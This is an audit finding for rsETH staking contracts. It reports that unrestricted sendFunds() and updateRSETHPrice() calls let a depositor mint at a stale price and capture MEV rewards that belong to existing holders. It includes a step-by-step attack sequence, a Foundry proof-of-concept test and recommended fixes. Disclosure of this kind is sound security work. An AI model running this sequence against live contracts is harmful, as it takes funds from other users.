Audit Report

## Title
Unprotected `FeeReceiver.sendFunds()` Enables Deposit Front-Running to Steal MEV Yield from rsETH Holders - (File: contracts/FeeReceiver.sol)

## Summary

`FeeReceiver.sendFunds()` has no access control, and `LRTOracle.updateRSETHPrice()` is callable by any address. An unprivileged attacker can atomically deposit ETH at the pre-reward rsETH price, flush accumulated MEV rewards into the deposit pool via `sendFunds()`, then trigger a price update — minting rsETH at a stale low price and immediately benefiting from the reward-inflated price, diluting existing holders' yield share.

## Finding Description

`FeeReceiver.sendFunds()` carries no role modifier:

```solidity
// contracts/FeeReceiver.sol:53-58
function sendFunds() external {
    uint256 balance = address(this).balance;
    ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();
    emit MevRewardsAddedToTVL(balance);
}
```

`LRTOracle.updateRSETHPrice()` is equally unrestricted (only `whenNotPaused`):

```solidity
// contracts/LRTOracle.sol:87-89
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
```

`_getTotalEthInProtocol()` counts `address(depositPool).balance` directly via `getETHDistributionData()`, so ETH flushed by `sendFunds()` is immediately reflected in the next price computation. `getRsETHAmountToMint()` divides by the **stored** `rsETHPrice`, not a live recalculation:

```solidity
// contracts/LRTDepositPool.sol:519-520
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
```

**Attack sequence (single transaction):**
1. Observe `FeeReceiver` holds accumulated MEV ETH.
2. Call `depositETH()` — rsETH minted at stale price (MEV not yet counted in TVL).
3. Call `FeeReceiver.sendFunds()` — MEV ETH moves to deposit pool, increasing `totalETHInProtocol`.
4. Call `LRTOracle.updateRSETHPrice()` — price recalculates upward over the enlarged ETH base.
5. Attacker's rsETH, minted at the old lower price, is now worth more ETH than deposited.

The `pricePercentageLimit` guard at lines 256–265 only triggers if `pricePercentageLimit > 0` **and** the price jump exceeds the configured threshold. If the parameter is unset (zero) or the MEV balance is within the limit, the guard is bypassed entirely and the attack succeeds unconditionally.

## Impact Explanation

**High — Theft of unclaimed yield.** Existing rsETH holders are entitled to MEV/EL rewards proportional to their holdings. An attacker who deposits immediately before triggering `sendFunds()` + `updateRSETHPrice()` dilutes that entitlement. For a 5 ETH MEV reward, a 100 ETH deposit against 1000 ETH TVL extracts approximately `5 × 100 / 1100 ≈ 0.45 ETH` from legitimate holders in a single transaction. The attacker can exit via secondary rsETH liquidity pools without waiting for the withdrawal queue. This matches the allowed impact: **High. Theft of unclaimed yield.**

## Likelihood Explanation

**High.** Both `FeeReceiver.sendFunds()` and `LRTOracle.updateRSETHPrice()` require no role, no key, and no governance action. Any EOA can execute the full sequence. MEV rewards accumulate continuously, so the opportunity recurs every time the `FeeReceiver` balance is non-trivial. The attacker does not need to front-run any external transaction — they initiate the entire sequence themselves, making it immune to mempool-ordering defenses.

## Recommendation

1. **Restrict `FeeReceiver.sendFunds()`** to a trusted role (e.g., `LRTConstants.MANAGER`) so only authorized callers can flush rewards into the deposit pool.
2. **Alternatively**, call `updateRSETHPrice()` atomically inside `receiveFromRewardReceiver()` (or inside `sendFunds()` itself) so the price is updated in the same transaction as the reward flush, eliminating the window in which a deposit can be made at the stale price.
3. Ensure `pricePercentageLimit` is always set to a non-zero value as a defense-in-depth measure, though this alone is insufficient since small MEV balances would still pass the threshold check.

## Proof of Concept

```solidity
// Foundry fork test outline
function testMEVFrontRunYieldTheft() public {
    // Setup: FeeReceiver has 5 ETH accumulated MEV rewards
    vm.deal(address(feeReceiver), 5 ether);

    uint256 stalePricePerRsETH = lrtOracle.rsETHPrice(); // e.g., 1.0 ETH

    // Step 1: Attacker deposits at stale price
    vm.prank(attacker);
    lrtDepositPool.depositETH{value: 100 ether}(0, "");
    uint256 attackerRsETH = rsETH.balanceOf(attacker);
    // attackerRsETH == 100e18 (at 1.0 price)

    // Step 2: Flush MEV rewards — no access control
    vm.prank(attacker);
    feeReceiver.sendFunds();

    // Step 3: Update price — public function
    vm.prank(attacker);
    lrtOracle.updateRSETHPrice();

    uint256 newPrice = lrtOracle.rsETHPrice(); // > 1.0 ETH
    uint256 attackerETHValue = attackerRsETH * newPrice / 1e18;

    // attackerETHValue > 100 ETH — attacker extracted yield from existing holders
    assertGt(attackerETHValue, 100 ether);
}
```

The stolen yield per attack equals `MEV_balance × attackerDeposit / (totalETHInProtocol + attackerDeposit)`, confirmed by the code path: `sendFunds()` → `receiveFromRewardReceiver()` → `address(depositPool).balance` increases → `_getTotalEthInProtocol()` returns higher value → `newRsETHPrice` increases → attacker's rsETH (minted at old price) is worth more.
